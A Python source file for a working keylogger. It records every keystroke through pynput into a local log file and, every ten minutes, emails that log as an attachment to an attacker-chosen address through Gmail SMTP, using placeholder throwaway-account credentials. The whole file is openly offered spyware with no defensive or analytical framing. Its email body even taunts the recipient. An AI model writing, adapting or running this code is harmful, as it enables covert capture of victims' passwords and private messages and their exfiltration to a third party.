import time
from email.mime.text import MIMEText
from pynput.keyboard import Key, Listener

sender_address = "THROWAWAY_ACCOUNT_MAILID"
sender_password = "THROWAWAY_ACCOUNT_PASSWORD"

receiver_address = "SEND_DATA_TO_MAILID"
send_every = 600  # sends log.txt file to mail every 10 minutes as long as the py script is running. Change if needed.
folder = "PATH_OF_LOG_FILE/log.txt"


class KeyLogger:
    def __init__(self):
        self.start_time = time.time()
        self.shift = False
        self.caps = False
        self.specials = {"`": "¬",
                         "1": "!",
                         "2": '"',
                         "3": "£",
                         "4": "$",
                         "5": "%",
                         "6": "^",
                         "7": "&",
                         "8": "*",
                         "9": "(",
                         "10": ")",
                         "-": "_",
                         "=": "+",
                         "[": "{",
                         "]": "}",
                         ";": ":",
                         "'": "@",
                         "#": "~",
                         ",": "<",
                         ".": ">",
                         "/": "/"}

    def send_email(self):
        import smtplib
        from email.mime.multipart import MIMEMultipart
        from email.mime.base import MIMEBase
        from email import encoders

        subject = "Captured Data"  # subject of email
        body = "Hello,\n\nAttached below is the KeyLogger Data. Hope you liked it!"  # message attached in the email

        msg = MIMEMultipart()
        msg['Subject'] = subject
        msg['From'] = sender_address
        msg['To'] = receiver_address
        body = MIMEText(body)
        msg.attach(body)

        part = MIMEBase('application', "octet-stream")
        part.set_payload(open("log.txt", "rb").read())
        encoders.encode_base64(part)

        part.add_header('Content-Disposition', 'attachment; filename="Data.txt"')  # attached filename

        msg.attach(part)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.login(sender_address, sender_password)
        server.sendmail(sender_address, receiver_address, msg.as_string())
        server.close()

        self.start_time = time.time()

    def write_key(self, key):
        with open(folder, "a") as file:
            if time.time() - self.start_time > send_every:
                self.send_email()

            if key == Key.space or key == Key.enter:
                file.write("\n")

            elif key == Key.shift:
                if not self.shift:
                    self.shift = True

            elif key == Key.caps_lock:
                if not self.caps:
                    self.caps = True
                else:
                    self.caps = False

            else:
                try:
                    if key.char.isalpha():
                        if self.caps or self.shift:
                            file.write(key.char.upper())

                        else:
                            file.write(key.char)

                    elif key.char.isdigit():
                        if self.shift:
                            file.write(self.specials[key.char])

                        else:
                            file.write(key.char)

                    else:
                        if self.shift:
                            file.write(self.specials[key.char])

                        else:
                            file.write(key.char)

                except:
                    pass

    def check_shift(self, key):
        if key == Key.shift:
            self.shift = False


key_logger = KeyLogger()

with Listener(on_press=key_logger.write_key, on_release=key_logger.check_shift) as listener:
    listener.join()
